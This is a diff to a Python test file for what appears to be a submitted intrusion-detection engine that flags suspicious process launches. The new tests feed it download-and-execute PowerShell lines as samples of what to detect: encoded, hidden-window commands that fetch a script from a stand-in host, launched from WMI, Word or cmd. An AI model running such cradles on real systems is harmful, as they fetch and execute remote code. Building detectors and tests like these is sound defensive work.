@@ -15,8 +15,8 @@ import unittest
 ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 sys.path.insert(0, ROOT)
 
-from submission import cases  # noqa: E402
-from submission.baseline import Fleet, Triage  # noqa: E402
+from submission import cases, experts  # noqa: E402
+from submission.baseline import Candidate, Fleet, Triage  # noqa: E402
 from submission.engine import Engine, Wave, parse_verdict  # noqa: E402
 from submission.state import MachineState, norm_path, ts_seconds, user_text  # noqa: E402
 
@@ -58,11 +58,12 @@ class FakeServer:
     """Answers 'attack' when the case mentions the marker, 'normal' otherwise."""
 
     def __init__(self, marker="evil.exe"):
-        self.marker, self.calls = marker, []
+        self.marker, self.calls, self.texts = marker, [], []
 
     def chat(self, messages, max_tokens, slot, grammar=None, timeout=None):
         text = messages[-1]["content"]
         self.calls.append(slot)
+        self.texts.append((slot, text))
         if slot == 1:
             return {"text": "Attack: x\nWhy this event: y\nChain: a -> b\nEvidence: z", "wall_s": 0.0}
         verdict = "attack" if self.marker in text else "normal"
@@ -199,7 +200,54 @@ class EngineRules(unittest.TestCase):
         with engine.lock:                                      # queue both before the worker sees the wave
             for e in (pstart("a.exe", "common.exe", "P1"), pstart("a.exe", "rare.exe", "P2")):
                 engine.submit(wave, tri.observe(e, wave.state.add(e)))
-            self.assertEqual(wave.queue[0][3].pair, ("a.exe", "rare.exe"))
+            self.assertEqual(wave.queue[0][-1].pair, ("a.exe", "rare.exe"))
+
+    def test_expert_cases_first_and_their_reasons_reach_the_explanation(self):
+        fleet = Fleet(None)
+        fleet.machines, fleet.pairs = ["m1", "m2"], {"wmiprvse.exe|powershell.exe": [0, 1]}
+        server, cb = FakeServer(marker="powershell"), Callbacks()
+        engine = Engine(server)
+        wave = Wave(machine="h", callbacks=cb, state=MachineState("h"))
+        tri = Triage("h", fleet)
+        tri.live = True
+        rare = pstart("explorer.exe", "notepad.exe", "P1", ts="2000-01-01T10:00:00.000-04:00")
+        ps = pstart("wmiprvse.exe", "powershell.exe", "P2", ts="2000-01-01T10:00:05.000-04:00",
+                    cmd="powershell -noP -sta -w 1 -enc " + base64.b64encode("Get-Date".encode("utf-16le")).decode())
+        with engine.lock:                                      # queue both before the worker sees the wave
+            for e in (rare, ps):
+                engine.submit(wave, tri.observe(e, wave.state.add(e)))
+            self.assertEqual(wave.queue[0][-1].event["id"], ps["id"])        # later and more common, but recognised
+            self.assertEqual(wave.stats["expert_cases"], 1)
+        engine.start_wave(wave)
+        deadline = time.time() + 5
+        while time.time() < deadline and not cb.explanations:
+            time.sleep(0.02)
+        self.assertEqual(cb.alerts, [ps["id"]])
+        explain_text = [t for slot, t in server.texts if slot == 1][0]
+        self.assertIn("Facts checked by code: PowerShell started by wmiprvse.exe; -EncodedCommand; hidden window; -NoProfile", explain_text)
+
+
+class ExpertRules(unittest.TestCase):
+    def cand(self, parent, child, cmd, kind="process"):
+        e = pstart(parent, child, "P1", cmd=cmd)
+        return Candidate(e, kind, (parent, child), 0, 61, 0.0)
+
+    def test_hidden_powershell_catches_the_three_delivery_types(self):
+        blob = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x/a')".encode("utf-16le")).decode()
+        wmi = self.cand("wmiprvse.exe", "powershell.exe", "powershell -noP -sta -w 1 -enc " + blob)
+        office = self.cand("winword.exe", "cmd.exe", "cmd.exe /k powershell.exe -NoP -sta -NonI -W Hidden "
+                                                     "$e=(New-Object System.Net.WebClient).DownloadString('http://x')")
+        batch = self.cand("cmd.exe", "powershell.exe", "powershell  -noP -sta -w 1 -enc  SQBGACgAJABQAFMAVgBFAHIA")
+        for c in (wmi, office, batch):
+            self.assertTrue(experts.hidden_powershell(c), c.event["properties"]["command_line"])
+        self.assertEqual(experts.hidden_powershell(wmi)[0], "PowerShell started by wmiprvse.exe")
+
+    def test_hidden_powershell_ignores_ordinary_powershell(self):
+        for cmd in ('powershell -c "Get-Service lwabeat"',            # the testbed's own monitoring
+                    "powershell -NoProfile -File C:\\scripts\\backup.ps1",   # one marker only
+                    "powershell -ExecutionPolicy Bypass -File a.ps1"):
+            self.assertEqual(experts.hidden_powershell(self.cand("svchost.exe", "powershell.exe", cmd)), (), cmd)
+        self.assertEqual(experts.hidden_powershell(self.cand("explorer.exe", "notepad.exe", "-enc -w hidden")), ())
 
 
 if __name__ == "__main__":
